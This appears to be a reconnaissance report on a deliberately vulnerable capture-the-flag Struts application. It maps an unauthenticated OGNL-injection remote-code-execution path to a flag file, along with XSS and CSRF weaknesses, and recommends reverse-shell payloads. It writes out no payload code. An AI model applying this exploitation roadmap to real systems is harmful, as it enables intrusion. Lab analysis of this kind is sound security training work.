**Overall Rating:** F (0/100) - Complete Security Failure

This is an **intentionally vulnerable CTF application** with deliberate security backdoors:

**Critical Vulnerabilities:**
1. ✅ **OGNL Injection RCE** - Trivially exploitable, zero authentication required
2. ✅ **Reflected XSS** - HTML escaping explicitly disabled
3. ✅ **No Authentication** - All endpoints publicly accessible
4. ✅ **No Authorization** - Zero access control mechanisms
5. ✅ **Insecure Session Management** - Missing Secure and SameSite flags
6. ✅ **No CSRF Protection** - RCE exploitable via CSRF
7. ✅ **Outdated Framework** - Struts 2.5.16 with multiple known CVEs
8. ✅ **No Input Validation** - All input accepted without validation
9. ✅ **No TLS/HTTPS** - All traffic in plaintext
10. ✅ **No Logging** - Complete attack invisibility

### Attack Surface Summary

**Total Network-Accessible Endpoints:** 2
- GET /index - Form display (leads to RCE endpoint)
- POST /sendMessageAction - CRITICAL RCE vulnerability

**Total Input Vectors:** 1
- message parameter - OGNL injection sink

**Total Authentication Mechanisms:** 0  
**Total Authorization Checks:** 0  
**Total Input Validation Rules:** 0  
**Total Security Guards:** 0

### Primary Attack Path

```
1. No authentication required
2. Submit OGNL expression in message parameter
3. Security controls deliberately disabled (Line 17)
4. OGNL evaluated with full Java reflection (Line 18)
5. Runtime.exec() invoked via static method access
6. Shell command executes with container privileges
7. Read /tmp/flag
8. Flag captured
```

**Attack Complexity:** TRIVIAL - Single HTTP request, no authentication, no evasion required

### For Penetration Testing Teams

**Priority Targets:**
1. POST /sendMessageAction with message=%{OGNL expression} - CRITICAL RCE
2. XSS in success.jsp output - HIGH severity
3. CSRF exploitation of RCE endpoint - HIGH severity

**Testing Recommendations:**
- Focus on OGNL injection as primary vulnerability
- Test command execution capabilities
- Verify flag retrieval from /tmp/flag
- Document complete exploitation chain
- Test both POST and GET methods for /sendMessageAction

**Tool Recommendations:**
- Manual exploitation via curl/Burp Suite
- Struts-specific OGNL payload generators
- Standard RCE reverse shell payloads

This reconnaissance phase is complete. All attack surface intelligence has been mapped and documented for the next phase of analysis.

---

**END OF RECONNAISSANCE DELIVERABLE**